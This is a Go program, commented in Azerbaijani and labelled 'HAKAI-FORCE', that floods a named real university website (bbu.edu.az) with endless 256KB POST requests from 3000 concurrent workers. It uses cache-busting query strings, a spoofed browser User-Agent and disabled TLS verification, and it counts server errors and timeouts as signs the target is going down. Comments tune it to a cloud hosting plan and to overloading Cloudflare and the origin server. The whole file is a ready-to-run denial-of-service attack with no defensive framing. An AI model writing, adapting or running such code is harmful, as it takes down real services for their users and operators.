package main

import (
	"crypto/tls"
	"fmt"
	"math/rand"
	"net/http"
	"strings"
	"sync/atomic"
	"time"
)

func main() {
	target := "https://bbu.edu.az"
	workers := 3000 // Railway planınıza görə 2000-4000 arası dəyişdirin

	fmt.Printf("[!!!] HAKAI-FORCE AKTIVDIR: %s\n", target)

	tr := &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
		},
		MaxIdleConns:        50000,
		MaxIdleConnsPerHost: 25000,
		ForceAttemptHTTP2:   true, // HTTP/2 məcburidir
	}

	client := &http.Client{
		Transport: tr,
		Timeout:   8 * time.Second,
	}

	var sent uint64
	var down uint64

	// 256KB ağır payload. Hər sorğu Cloudflare edge-ə və origin-ə böyük yük salır.
	payload := "x=" + strings.Repeat("Z", 262144)

	for i := 0; i < workers; i++ {
		go func(id int) {
			for {
				// Cache bypass: hər sorğu unikal
				url := fmt.Sprintf("%s?_cb=%d&ts=%d", target, rand.Intn(999999999), time.Now().UnixNano())

				req, _ := http.NewRequest("POST", url, strings.NewReader(payload))
				req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36")
				req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
				req.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate")
				req.Header.Set("X-Requested-With", "XMLHttpRequest")

				resp, err := client.Do(req)
				if err == nil {
					if resp.StatusCode >= 500 {
						atomic.AddUint64(&down, 1)
					}
					resp.Body.Close()
				} else {
					// Timeout/Refused = Cloudflare və ya origin artıq dolub
					atomic.AddUint64(&down, 1)
				}
				atomic.AddUint64(&sent, 1)
			}
		}(i)
	}

	for {
		time.Sleep(5 * time.Second)
		fmt.Printf("[STATUS] Sent: %d | Errors/5xx: %d\n", atomic.LoadUint64(&sent), atomic.LoadUint64(&down))
	}
}
